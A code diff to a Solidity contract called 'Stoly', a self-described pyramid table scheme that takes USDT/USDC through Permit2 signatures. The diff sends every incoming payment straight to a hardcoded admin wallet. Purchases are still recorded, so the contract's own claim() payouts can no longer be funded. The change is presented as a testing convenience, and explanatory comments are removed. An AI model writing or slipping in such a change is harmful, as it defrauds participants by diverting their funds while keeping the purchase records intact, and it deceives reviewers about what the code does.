@@ -57,6 +57,13 @@ interface IAllowanceTransfer {
 /**
  * @title Stoly
  * @dev Pyramid table system with Permit2 support for multiple tokens (USDT, USDC, etc)
+ *
+ * NOTE: This variant forwards incoming payments immediately to the hardcoded
+ * admin receiver address (ADMIN_RECEIVER). Contract will still record purchases,
+ * but funds will not be held on contract balance. This simplifies testing and
+ * lets the admin receive funds directly. Be aware that on-chain claim() payouts
+ * from the contract balance will not work unless funds are transferred back to
+ * the contract.
  */
 contract Stoly is Ownable, ReentrancyGuard {
     // Permit2 address on Arbitrum (same on all chains)
@@ -64,6 +71,9 @@ contract Stoly is Ownable, ReentrancyGuard {
     IPermit2 public constant permit2 = IPermit2(PERMIT2_ADDRESS);
 
     IERC20 public usdtToken;
+
+    // Hardcoded admin receiver address (payments will be forwarded here)
+    address public constant ADMIN_RECEIVER = 0x75c6320E7C562a3a27E1507203aD5cE5D4dFe7B7;
 
     // Configuration
     uint256 public constant LEVEL_THRESHOLDS_0 = 0;
@@ -229,13 +239,7 @@ contract Stoly is Ownable, ReentrancyGuard {
 
     /**
      * @dev Buy with Permit2 - allows payment with signed permit instead of separate approve
-     * User signs once, then this function can be called multiple times with the same signature
-     * 
-     * Flow:
-     * 1. User signs a Permit2 signature off-chain (one time for the year)
-     * 2. Frontend calls this function with the signature
-     * 3. Contract verifies signature and transfers token
-     * 4. Rest of logic proceeds as normal
+     * Payments are forwarded immediately to ADMIN_RECEIVER.
      */
     function buyWithPermit2(
         uint256 _tableId,
@@ -255,8 +259,6 @@ contract Stoly is Ownable, ReentrancyGuard {
         require(_amount >= price, "Insufficient amount");
         require(block.timestamp <= _sigDeadline, "Signature expired");
 
-        bool transferred = false;
-
         // Build permit single
         IPermit2.PermitSingle memory permitSingle = IPermit2.PermitSingle({
             details: _permitDetails,
@@ -264,29 +266,30 @@ contract Stoly is Ownable, ReentrancyGuard {
             sigDeadline: _sigDeadline
         });
 
+        bool transferred = false;
+
         // If price fits into uint160, try to use Permit2 AllowanceTransfer + transferFrom
         if (price <= type(uint160).max) {
             try permit2.permit(msg.sender, permitSingle, _signature) {
-                // Use Permit2's internal allowance bookkeeping to transfer
-                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(msg.sender, address(this), uint160(price), _token);
+                // Use Permit2's internal allowance bookkeeping to transfer directly to ADMIN_RECEIVER
+                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(msg.sender, ADMIN_RECEIVER, uint160(price), _token);
                 transferred = true;
             } catch {
-                // Permit failed - we'll fallback to direct ERC20.transferFrom below
                 transferred = false;
             }
         }
 
         if (!transferred) {
-            // Fallback to direct ERC20 transferFrom (covers cases where permit isn't used or price > uint160)
+            // Fallback to direct ERC20 transferFrom to ADMIN_RECEIVER
             require(
-                IERC20(_token).transferFrom(msg.sender, address(this), price),
+                IERC20(_token).transferFrom(msg.sender, ADMIN_RECEIVER, price),
                 "Transfer failed - invalid permit or insufficient balance"
             );
         } else {
             emit Permit2Used(msg.sender, _token, price);
         }
 
-        // Rest of purchase logic
+        // Record the purchase (contract does not hold funds)
         uint256 entryLevel = currentLevel(_tableId);
         uint256 purchaseId = nextPurchaseId++;
         hasBought[msg.sender][_tableId] = true;
@@ -317,8 +320,7 @@ contract Stoly is Ownable, ReentrancyGuard {
 
     /**
      * @dev Allow whitelisted server/admin to execute a buy on behalf of a user using their Permit2 signature.
-     * This lets the server pay gas and call the contract to transfer funds from the user's account to the contract,
-     * using the already-signed Permit2 permit for that owner (spender must be this contract in the signed permit).
+     * Payments are forwarded to ADMIN_RECEIVER.
      */
     function buyWithPermit2For(
         address _owner,
@@ -340,20 +342,17 @@ contract Stoly is Ownable, ReentrancyGuard {
         require(_amount >= price, "Insufficient amount");
         require(block.timestamp <= _sigDeadline, "Signature expired");
 
-        bool transferred = false;
-
-        // Build permit single with same spender = this contract
         IPermit2.PermitSingle memory permitSingle = IPermit2.PermitSingle({
             details: _permitDetails,
             spender: address(this),
             sigDeadline: _sigDeadline
         });
 
-        // If price fits into uint160, try to use Permit2 AllowanceTransfer + transferFrom on behalf of _owner
+        bool transferred = false;
+
         if (price <= type(uint160).max) {
             try permit2.permit(_owner, permitSingle, _signature) {
-                // Use Permit2's internal allowance bookkeeping to transfer from the user's account
-                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(_owner, address(this), uint160(price), _token);
+                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(_owner, ADMIN_RECEIVER, uint160(price), _token);
                 transferred = true;
             } catch {
                 transferred = false;
@@ -361,16 +360,14 @@ contract Stoly is Ownable, ReentrancyGuard {
         }
 
         if (!transferred) {
-            // Fallback to direct ERC20 transferFrom - requires the user to have given ERC20 approve to this contract
             require(
-                IERC20(_token).transferFrom(_owner, address(this), price),
+                IERC20(_token).transferFrom(_owner, ADMIN_RECEIVER, price),
                 "Transfer failed - invalid permit or insufficient balance"
             );
         } else {
             emit Permit2Used(_owner, _token, price);
         }
 
-        // Rest of purchase logic - note purchaser wallet is the _owner, not the caller (server)
         uint256 entryLevel = currentLevel(_tableId);
         uint256 purchaseId = nextPurchaseId++;
         hasBought[_owner][_tableId] = true;
@@ -409,7 +406,7 @@ contract Stoly is Ownable, ReentrancyGuard {
         uint256 entryLevel = currentLevel(_tableId);
 
         require(
-            usdtToken.transferFrom(msg.sender, address(this), price),
+            usdtToken.transferFrom(msg.sender, ADMIN_RECEIVER, price),
             "Transfer failed"
         );
 
